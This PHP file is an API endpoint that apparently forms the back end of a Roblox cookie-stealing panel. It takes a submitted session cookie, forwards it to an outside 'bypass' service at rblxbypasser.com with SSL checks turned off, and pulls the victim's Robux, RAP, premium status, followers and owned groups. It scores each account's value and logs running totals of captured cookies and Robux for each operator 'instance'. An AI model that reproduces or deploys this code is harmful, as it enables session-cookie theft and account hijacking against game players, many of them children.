<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
$cookie = $input['cookie'] ?? '';
$instance = $input['instance'] ?? '';
$checkOnly = $input['checkOnly'] ?? false;

if (empty($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Cookie required']);
    exit;
}

// Call external bypass API
$externalApiUrl = 'https://rblxbypasser.com/api/bypass';
$postData = json_encode(['cookie' => $cookie]);

$ch = curl_init($externalApiUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// Check if external API call failed
if ($httpCode !== 200 || !empty($curlError) || empty($response)) {
    http_response_code(400);
    echo json_encode([
        'success' => false, 
        'valid' => false,
        'error' => 'Request Failed',
        'message' => 'Failed to connect to bypass service'
    ]);
    exit;
}

// Parse the response from external API
$externalData = json_decode($response, true);

// Check if external API returned error or invalid data
if (!isset($externalData['success']) || !$externalData['success']) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'valid' => false,
        'error' => 'Invalid Cookie',
        'message' => $externalData['message'] ?? 'Cookie is invalid or expired'
    ]);
    exit;
}

// Extract data from external API response
$userInfo = $externalData['userInfo'] ?? [];
$detailedInfo = $externalData['detailedInfo'] ?? [];

// If check only mode, return basic validation
if ($checkOnly) {
    echo json_encode([
        'success' => true,
        'valid' => true,
        'username' => $userInfo['username'] ?? $detailedInfo['username'] ?? 'Unknown',
        'userId' => $userInfo['userId'] ?? $detailedInfo['userId'] ?? 0
    ]);
    exit;
}

// Extract all data
$userId = $userInfo['userId'] ?? ($detailedInfo['userId'] ?? 0);
$username = $userInfo['username'] ?? ($detailedInfo['username'] ?? 'Unknown');
$displayName = $userInfo['displayName'] ?? ($detailedInfo['displayName'] ?? 'Unknown');
$avatarUrl = $externalData['avatarUrl'] ?? ($detailedInfo['avatarUrl'] ?? '');
$robux = $userInfo['robux'] ?? ($detailedInfo['robux'] ?? 0);
$rap = $userInfo['rap'] ?? ($detailedInfo['rap'] ?? 0);
$premium = $userInfo['isPremium'] ?? ($detailedInfo['isPremium'] ?? false);
$voiceChat = $userInfo['vcStatus'] ?? ($detailedInfo['vcStatus'] ?? '❌ Disabled');
$friendsCount = $userInfo['friendsCount'] ?? ($detailedInfo['friendsCount'] ?? 0);
$followersCount = $userInfo['followersCount'] ?? ($detailedInfo['followersCount'] ?? 0);
$accountAge = $userInfo['accountAge'] ?? ($detailedInfo['accountAge'] ?? 'Unknown');
$groupsOwned = $userInfo['totalGroupsOwned'] ?? ($detailedInfo['totalGroupsOwned'] ?? 0);

// Calculate account score (0-100)
$accountScore = 0;
if ($robux > 0) $accountScore += min(20, $robux / 1000);
if ($rap > 0) $accountScore += min(20, $rap / 5000);
if ($premium) $accountScore += 15;
if (strpos($voiceChat, '✅') !== false) $accountScore += 10;
if ($friendsCount > 0) $accountScore += min(10, $friendsCount / 50);
if ($followersCount > 0) $accountScore += min(15, $followersCount / 200);
if ($groupsOwned > 0) $accountScore += min(10, $groupsOwned * 2);
$accountScore = round($accountScore);

// Update instance stats
if (!empty($instance)) {
    $instanceData = getInstanceData($instance);
    if ($instanceData) {
        $instanceData['stats']['totalCookies']++;
        $instanceData['stats']['totalRobux'] += $robux;
        $instanceData['stats']['totalRAP'] += $rap;
        
        updateDailyStats($instance, 'cookies', 1);
        updateDailyStats($instance, 'robux', $robux);
        updateDailyStats($instance, 'rap', $rap);
        
        saveInstanceData($instance, $instanceData);
    }
}
updateGlobalStats('totalCookies');

// Return formatted response
echo json_encode([
    'success' => true,
    'valid' => true,
    'avatarUrl' => $avatarUrl,
    'userInfo' => [
        'userId' => $userId,
        'username' => $username,
        'displayName' => $displayName,
        'robux' => $robux,
        'rap' => $rap,
        'premium' => $premium ? '✅ True' : '❌ False',
        'voiceChat' => $voiceChat,
        'friends' => $friendsCount,
        'followers' => $followersCount,
        'accountAge' => $accountAge,
        'groupsOwned' => $groupsOwned,
        'accountScore' => $accountScore
    ],
    'detailedInfo' => $detailedInfo
]);
?>
